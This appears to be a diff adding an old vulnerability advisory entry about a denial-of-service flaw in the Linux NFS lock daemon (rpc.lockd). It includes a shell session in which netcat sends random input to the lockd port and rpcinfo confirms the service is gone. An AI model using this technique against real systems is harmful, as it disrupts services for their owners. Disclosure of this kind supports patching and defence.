@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/1372/info
+
+A denial of service attack exists in the NFS lock daemon supplied with Linux. By connecting to the port rpc.lockd is running on, and supplying random input, it will cause lockd to exit with an error. The socket associated with rpc.lockd is also not properly released, and cannot be rebound to without a reboot.
+
+This vulnerability most likely affects all Linux distributions running NFS. 
+
+[root@hiro /]# rpcinfo -p target
+program vers proto port
+100000 2 tcp 111 portmapper
+100000 2 udp 111 portmapper
+100021 1 udp 1024 nlockmgr
+100021 3 udp 1024 nlockmgr
+100021 1 tcp 1024 nlockmgr
+100021 3 tcp 1024 nlockmgr
+100024 1 udp 831 status
+100024 1 tcp 833 status
+[root@hiro /]# nc -p 1000 target 1024
+alksdjfalskdjfsdafs
+Here, I issued a Ctrl-C to get out of netcat, and got:
+punt!
+[root@hiro /]#
+[root@hiro /]# rpcinfo -p target
+program vers proto port
+100000 2 tcp 111 portmapper
+100000 2 udp 111 portmapper
+100024 1 udp 831 status
+100024 1 tcp 833 status
+[root@hiro /]# 
